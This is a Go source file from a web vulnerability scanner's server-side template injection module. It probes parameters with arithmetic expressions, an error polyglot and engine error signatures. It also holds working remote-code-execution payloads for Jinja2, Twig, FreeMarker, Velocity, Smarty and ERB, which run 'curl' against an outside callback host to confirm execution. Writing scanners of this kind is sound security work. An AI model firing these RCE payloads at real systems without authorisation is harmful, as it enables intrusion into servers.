package sstiscan

import (
	"context"
	"fmt"
	"net/http"
	"sort"
	"strings"
	"sync"
	"time"

	"github.com/Indigo6415/Aperture/internal/collaborator"
	"github.com/Indigo6415/Aperture/internal/scanprogress"
)

type moduleMeta struct{ id, name, severity string }

var mathEvalModule = moduleMeta{id: "math-eval", name: "Template expression evaluated", severity: "critical"}
var errorSignatureModule = moduleMeta{id: "error-signature", name: "Template engine error signature", severity: "high"}
var oobRCEModule = moduleMeta{id: "oob-rce", name: "Blind SSTI -> RCE (out-of-band callback)", severity: "critical"}

// mathPayloads is one arithmetic expression per template-engine syntax --
// ports/extends probescan's own sstiPayloads table with more engines and an
// explicit engine attribution per entry. A response that contains expected
// but not the literal payload text proves the engine evaluated it rather
// than echoing it back as plain text.
//
// The multiplicands (1337*7331=9801547) are deliberately larger than the
// classic 7*7=49 textbook probe: 49 is a short, everyday number that can
// already appear in a page (prices, counts, IDs, ...) by pure coincidence,
// producing a false positive. An eight-digit product is implausible to find
// verbatim in unrelated page content, so a match is strong evidence the
// engine actually evaluated the expression.
var mathPayloads = []struct{ engine, payload, expected string }{
	{"Jinja2 / Twig / Nunjucks / Pebble", "{{1337*7331}}", "9801547"},
	{"Jinja2 (Python string-multiply -- Twig/Nunjucks error on this instead, which disambiguates)", "{{11*'7'}}", "77777777777"},
	{"FreeMarker / Mako", "${1337*7331}", "9801547"},
	{"ERB (Ruby)", "<%= 1337*7331 %>", "9801547"},
	{"Smarty", "{1337*7331}", "9801547"},
	{"Velocity", "#set($aperture=1337*7331)$aperture", "9801547"},
	{"Thymeleaf (inline expression)", "[[${1337*7331}]]", "9801547"},
	{"Pug / Jade", "#{1337*7331}", "9801547"},
}

// errorPolyglotPayload is the well-known multi-engine syntax-breaking
// string (James Kettle / PortSwigger's SSTI polyglot): malformed enough to
// trip the parser of virtually every mainstream template engine.
const errorPolyglotPayload = `${{<%[%'"}%\.}}%\`

// errorSignatures maps an engine name to substrings that only appear in
// *that* engine's own parse/runtime error output. Generic fragments such as
// "Unexpected token" or "template: " were removed: they appear in ordinary
// JavaScript and HTML error text and produced false positives. The Go engine
// is the one exception, which needs both of its substrings (see
// goTemplateEngine).
var errorSignatures = map[string][]string{
	"Jinja2":           {"jinja2.exceptions", "TemplateSyntaxError", "jinja2.UndefinedError"},
	"Twig":             {"Twig\\Error", "Twig_Error"},
	"FreeMarker":       {"freemarker.core", "FreeMarkerException"},
	"Velocity":         {"org.apache.velocity", "VelocityException"},
	"Smarty":           {"Smarty_Internal"},
	"Thymeleaf":        {"org.thymeleaf", "TemplateProcessingException"},
	"ERB / Ruby":       {"ActionView::Template::Error", "(erb):"},
	"Mako":             {"mako.exceptions"},
	"Pebble":           {"com.mitchellbosecke.pebble", "PebbleException"},
	"Handlebars":       {"Handlebars.Exception"},
	"Go text/template": {"template: ", `executing "`},
}

// goTemplateEngine is the engine whose signatures must all be present.
const goTemplateEngine = "Go text/template"

// firstErrorSignature returns the first engine whose error signature appears
// in body and not in baseline. Engines are checked in sorted order so the same
// body always names the same engine: iterating the map directly made the
// reported engine change from run to run when two signatures matched.
func firstErrorSignature(body, baseline string) (engine, match string) {
	names := make([]string, 0, len(errorSignatures))
	for name := range errorSignatures {
		names = append(names, name)
	}
	sort.Strings(names)
	for _, name := range names {
		sigs := errorSignatures[name]
		if name == goTemplateEngine {
			if allSignaturesPresent(body, baseline, sigs) {
				return name, sigs[0]
			}
			continue
		}
		for _, s := range sigs {
			if strings.Contains(body, s) && !strings.Contains(baseline, s) {
				return name, s
			}
		}
	}
	return "", ""
}

// allSignaturesPresent reports whether every signature is in body and none of
// them is already in baseline.
func allSignaturesPresent(body, baseline string, sigs []string) bool {
	for _, s := range sigs {
		if !strings.Contains(body, s) || strings.Contains(baseline, s) {
			return false
		}
	}
	return true
}

// neutralMathValue is sent to the same point in place of a template expression.
// It cannot evaluate to any expected result, so it works as a negative control.
const neutralMathValue = "aperture1337neutral"

// pointDescriptor renders pt for a Finding's Label/Detail.
func pointDescriptor(pt injectionPoint) string {
	switch pt.Kind {
	case kindHeader:
		return fmt.Sprintf("the %q request header on %s", pt.Param, pt.URL)
	case kindForm:
		return fmt.Sprintf("form field %q (%s %s)", pt.Param, pt.Method, pt.URL)
	default:
		return fmt.Sprintf("query parameter %q on %s", pt.Param, pt.URL)
	}
}

// runMathEvalModule fires every math payload at every point and flags a point
// where the evaluated result appears without the literal expression. Each
// point reports at most one finding. A hit only counts when the result is not
// already on the original page and does not appear for a neutral value, so a
// page that simply prints that number is not mistaken for template evaluation.
func runMathEvalModule(ctx context.Context, deps runDeps) []Finding {
	client := newClient()
	return runPointModule(deps, mathEvalModule, func(pt injectionPoint) (Finding, bool) {
		return probeMathPoint(ctx, deps, client, pt)
	})
}

// runPointModule runs check once per injection point, reporting each point as
// one progress check for meta, and returns the findings in point order. A
// point that yields nothing simply doesn't contribute a finding.
func runPointModule(deps runDeps, meta moduleMeta, check func(pt injectionPoint) (Finding, bool)) []Finding {
	type indexedPoint struct {
		idx int
		pt  injectionPoint
	}
	items := make([]indexedPoint, len(deps.points))
	for i, pt := range deps.points {
		items[i] = indexedPoint{idx: i, pt: pt}
	}
	found := make([]*Finding, len(items))
	scanprogress.Each(deps.rep, 0, items, func(it indexedPoint) scanprogress.Check {
		return scanprogress.Check{ID: meta.id + "|" + pointKey(it.pt), Label: pointDescriptor(it.pt), Group: meta.name}
	}, func(it indexedPoint) (int, error) {
		f, ok := check(it.pt)
		if !ok {
			return 0, nil
		}
		found[it.idx] = &f
		return 1, nil
	})
	out := []Finding{}
	for _, f := range found {
		if f != nil {
			out = append(out, *f)
		}
	}
	return out
}

// probeMathPoint tries the math payloads on one point in order, stopping at the
// first that evaluates. It returns the finding and true when one does.
func probeMathPoint(ctx context.Context, deps runDeps, client *http.Client, pt injectionPoint) (Finding, bool) {
	for _, mp := range mathPayloads {
		res := fetchInjectionPointThrottled(ctx, deps.sem, client, pt, mp.payload, deps.req.Headers)
		if res.Err != nil {
			continue
		}
		if !strings.Contains(res.Body, mp.expected) || strings.Contains(res.Body, mp.payload) {
			continue
		}
		// The result already on the page is not evaluated output.
		if strings.Contains(deps.baseline, mp.expected) {
			continue
		}
		// Negative control: the same point with a value that cannot evaluate.
		// If the expected result still shows, the page prints it on its own.
		control := fetchInjectionPointThrottled(ctx, deps.sem, client, pt, neutralMathValue, deps.req.Headers)
		if control.Err == nil && strings.Contains(control.Body, mp.expected) {
			continue
		}

		engine := mp.engine
		// The first payload is shared by Jinja2, Twig, and other engines. The
		// string-multiply payload is evaluated only by Python, so if it gives
		// its expected result, the engine is Jinja2 rather than a sibling.
		if mp.payload == "{{1337*7331}}" {
			if disamb := fetchInjectionPointThrottled(ctx, deps.sem, client, pt, mathPayloads[1].payload, deps.req.Headers); disamb.Err == nil && strings.Contains(disamb.Body, mathPayloads[1].expected) {
				engine = "Jinja2 (Python)"
			}
		}
		return Finding{
			Label: fmt.Sprintf("Possible %s SSTI via %s", engine, pointDescriptor(pt)),
			Detail: fmt.Sprintf(
				"Set %s to the template expression `%s`; the response body then contained `%s` (the evaluated result) instead of the literal payload text. The result was not on the original page, and a neutral value did not produce it, so the server evaluated this value as a %s template expression.",
				pointDescriptor(pt), mp.payload, mp.expected, engine,
			),
			Evidence:   mp.expected,
			Method:     pt.Method,
			StatusCode: res.StatusCode,
			Request:    &res.Request,
			Confidence: ConfidenceConfirmed,
		}, true
	}
	return Finding{}, false
}

// runErrorSignatureModule fires the one syntax-breaking polyglot at every
// point and flags a response matching an engine's own error signature. The
// error alone doesn't prove evaluation, so these findings stay "likely".
func runErrorSignatureModule(ctx context.Context, deps runDeps) []Finding {
	client := newClient()
	return runPointModule(deps, errorSignatureModule, func(pt injectionPoint) (Finding, bool) {
		res := fetchInjectionPointThrottled(ctx, deps.sem, client, pt, errorPolyglotPayload, deps.req.Headers)
		if res.Err != nil {
			return Finding{}, false
		}
		engine, match := firstErrorSignature(res.Body, deps.baseline)
		if engine == "" {
			return Finding{}, false
		}
		return Finding{
			Label: fmt.Sprintf("Possible %s template engine error via %s", engine, pointDescriptor(pt)),
			Detail: fmt.Sprintf(
				"Set %s to the template-breaking polyglot `%s`; the response then contained a %s error signature that the original page did not contain -- the server likely passed this value into a %s template without escaping its syntax. The error alone doesn't confirm full expression evaluation; cross-check against the math-eval module's findings for the same point.",
				pointDescriptor(pt), errorPolyglotPayload, engine, engine,
			),
			Evidence:   match,
			Method:     pt.Method,
			StatusCode: res.StatusCode,
			Request:    &res.Request,
			Confidence: ConfidenceLikely,
		}, true
	})
}

// oobPointCheck is the progress entry for one point's out-of-band RCE check.
func oobPointCheck(pt injectionPoint) scanprogress.Check {
	return scanprogress.Check{ID: oobRCEModule.id + "|" + pointKey(pt), Label: pointDescriptor(pt), Group: oobRCEModule.name}
}

// startOOBPoints plans every point's out-of-band check and marks them all
// running. The OOB module fires every payload and then waits on one shared
// callback window, so every point is in flight until that wait settles.
func startOOBPoints(rep scanprogress.Reporter, points []injectionPoint) {
	checks := make([]scanprogress.Check, len(points))
	for i, pt := range points {
		checks[i] = oobPointCheck(pt)
	}
	rep.Plan(checks...)
	for _, c := range checks {
		rep.Start(c.ID)
	}
}

// rceTemplatePayloads are well-documented, engine-specific SSTI-to-RCE
// payloads (the same ones cited across PortSwigger/HackTricks SSTI
// write-ups) built around a single shell command -- here, always a curl of
// the collaborator callback address. Each is best-effort: it depends on the
// target engine's exact version/sandboxing matching the documented gadget,
// same caveat ssrf.internalNetworkModule gives its own anomaly-based
// findings.
var rceTemplatePayloads = []struct {
	engine string
	build  func(cmd string) string
}{
	{"Jinja2 (unsandboxed Flask/Python)", func(cmd string) string {
		return fmt.Sprintf(`{{ self.__init__.__globals__.__builtins__.__import__('os').popen(%q).read() }}`, cmd)
	}},
	{"Twig >=2.4 (sandbox disabled, PHP)", func(cmd string) string {
		return fmt.Sprintf(`{{['%s']|filter('system')}}`, cmd)
	}},
	{"FreeMarker (Java)", func(cmd string) string {
		return fmt.Sprintf(`<#assign ex="freemarker.template.utility.Execute"?new()>${ex(%q)}`, cmd)
	}},
	{"Velocity (Java)", func(cmd string) string {
		return fmt.Sprintf(`#set($e="e")$e.getClass().forName("java.lang.Runtime").getMethod("exec",$e.getClass().forName("java.lang.String")).invoke($e.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),%q)`, cmd)
	}},
	{"Smarty (legacy, {php} tags enabled)", func(cmd string) string {
		return fmt.Sprintf(`{php}exec(%q);{/php}`, cmd)
	}},
	{"ERB (Ruby, backtick exec)", func(cmd string) string {
		return fmt.Sprintf("<%%= `%s` %%>", cmd)
	}},
}

// runOOBRCEModule dispatches to the shared-token or per-point-token path --
// see OOBConfig's doc comment for when each applies.
func runOOBRCEModule(ctx context.Context, deps runDeps, oob OOBConfig) []Finding {
	if oob.SharedToken != "" {
		return runOOBRCEModuleShared(ctx, deps, oob)
	}

	if oob.Registry == nil || oob.CallbackBaseURL == "" {
		return []Finding{{
			Label:  "Out-of-band callback listener not configured",
			Detail: "This module confirms a fully blind SSTI (no visible signal in the math-eval or error-signature modules -- auto-escaped output, a generic error page, or a sandboxed-but-still-exploitable engine) by sending well-documented, engine-specific RCE payloads that shell out to curl Aperture's own collaborator listener. Configure a collaborator domain/answer IP in Settings to enable it.",
		}}
	}

	client := newClient()
	type tokenInfo struct {
		pt    injectionPoint
		token string
	}
	infos := make([]tokenInfo, len(deps.points))
	for i, pt := range deps.points {
		infos[i] = tokenInfo{pt: pt, token: oob.Registry.NewToken()}
	}

	startOOBPoints(deps.rep, deps.points)

	var wg sync.WaitGroup
	for _, info := range infos {
		callbackURL := strings.TrimRight(oob.CallbackBaseURL, "/") + "/collab/" + info.token + "/"
		cmd := "curl " + callbackURL
		for _, rp := range rceTemplatePayloads {
			wg.Add(1)
			go func(pt injectionPoint, payload string) {
				defer wg.Done()
				fetchInjectionPointThrottled(ctx, deps.sem, client, pt, payload, deps.req.Headers)
			}(info.pt, rp.build(cmd))
		}
	}
	wg.Wait()

	tokens := make([]string, 0, len(infos))
	for _, info := range infos {
		tokens = append(tokens, info.token)
	}
	deps.rep.Phase("Waiting for out-of-band callbacks")
	collaborator.WaitForRegistry(ctx, oob.Registry, tokens, collaborator.DefaultPollInterval, collaborator.DefaultQuietPeriod, collaborator.DefaultMaxWait)

	var out []Finding
	for _, info := range infos {
		id := oobPointCheck(info.pt).ID
		hits := oob.Registry.Poll(info.token)
		if len(hits) == 0 {
			deps.rep.Done(id, 0, nil)
			continue
		}
		out = append(out, sstiOOBFinding(info.pt, hits))
		deps.rep.Done(id, 1, nil)
	}
	return out
}

// sstiIdentifierFor derives a stable, DNS-label-and-URL-path-safe
// identifier for pt -- used only on the oob.SharedToken path, where many
// points share one token and need to stay distinguishable. Same approach as
// ssrf.ssrfIdentifierFor.
func sstiIdentifierFor(pt injectionPoint) string {
	var b strings.Builder
	b.WriteString("ssti-")
	for _, r := range pt.Param {
		switch {
		case r >= 'a' && r <= 'z', r >= '0' && r <= '9':
			b.WriteRune(r)
		case r >= 'A' && r <= 'Z':
			b.WriteRune(r + ('a' - 'A'))
		default:
			b.WriteByte('-')
		}
	}
	return b.String()
}

// runOOBRCEModuleShared is runOOBRCEModule's oob.SharedToken path -- see
// OOBConfig's doc comment.
func runOOBRCEModuleShared(ctx context.Context, deps runDeps, oob OOBConfig) []Finding {
	client := newClient()
	type pointInfo struct {
		pt         injectionPoint
		identifier string
	}
	infos := make([]pointInfo, len(deps.points))
	for i, pt := range deps.points {
		infos[i] = pointInfo{pt: pt, identifier: sstiIdentifierFor(pt)}
	}

	startOOBPoints(deps.rep, deps.points)

	var wg sync.WaitGroup
	for _, info := range infos {
		var callbackURL string
		if oob.SharedProvider == "webhooksite" {
			callbackURL = collaborator.WebhookSiteCallbackURL(oob.SharedToken) + "/" + info.identifier + "/"
		} else {
			callbackURL = strings.TrimRight(oob.CallbackBaseURL, "/") + "/collab/" + oob.SharedToken + "/" + info.identifier + "/"
		}
		cmd := "curl " + callbackURL
		for _, rp := range rceTemplatePayloads {
			wg.Add(1)
			go func(pt injectionPoint, payload string) {
				defer wg.Done()
				fetchInjectionPointThrottled(ctx, deps.sem, client, pt, payload, deps.req.Headers)
			}(info.pt, rp.build(cmd))
		}
	}
	wg.Wait()

	deps.rep.Phase("Waiting for out-of-band callbacks")
	var hits []collaborator.Interaction
	var err error
	if oob.SharedProvider == "webhooksite" {
		hits, err = collaborator.WaitForCallbacks(ctx, func(c context.Context) ([]collaborator.Interaction, error) {
			return collaborator.PollWebhookSite(c, oob.SharedToken)
		}, collaborator.DefaultPollInterval, collaborator.DefaultQuietPeriod, collaborator.DefaultMaxWait)
	} else if oob.Registry != nil {
		collaborator.WaitForRegistry(ctx, oob.Registry, []string{oob.SharedToken}, collaborator.DefaultPollInterval, collaborator.DefaultQuietPeriod, collaborator.DefaultMaxWait)
		hits = oob.Registry.Poll(oob.SharedToken)
	}
	// A failed poll discards whatever it returned, so every point reads as "no callback".
	if err != nil {
		hits = nil
	}

	byIdentifier := map[string][]collaborator.Interaction{}
	for _, h := range hits {
		byIdentifier[h.Identifier] = append(byIdentifier[h.Identifier], h)
	}

	var out []Finding
	for _, info := range infos {
		id := oobPointCheck(info.pt).ID
		matched := byIdentifier[info.identifier]
		if len(matched) == 0 {
			deps.rep.Done(id, 0, nil)
			continue
		}
		out = append(out, sstiOOBFinding(info.pt, matched))
		deps.rep.Done(id, 1, nil)
	}
	return out
}

// sstiOOBFinding builds the Finding every confirmed-hit path above returns,
// given pt and its full hit list.
func sstiOOBFinding(pt injectionPoint, hits []collaborator.Interaction) Finding {
	h := hits[0]
	return Finding{
		Label: fmt.Sprintf("%s triggered a blind out-of-band callback (confirmed RCE via SSTI)", pointDescriptor(pt)),
		Detail: fmt.Sprintf(
			"One of this module's engine-specific RCE payloads, sent to %s, caused the target to call back out to an Aperture-controlled listener (%d interaction(s), first from %s) -- confirms server-side code execution via template injection, independent of anything visible in the HTTP response itself.",
			pointDescriptor(pt), len(hits), h.RemoteAddr,
		),
		Evidence: fmt.Sprintf("%s callback from %s at %s", h.Protocol, h.RemoteAddr, h.Timestamp.Format(time.RFC3339)),
		Method:   pt.Method,
		// A callback that the target itself made is direct proof of execution.
		Confidence: ConfidenceConfirmed,
	}
}
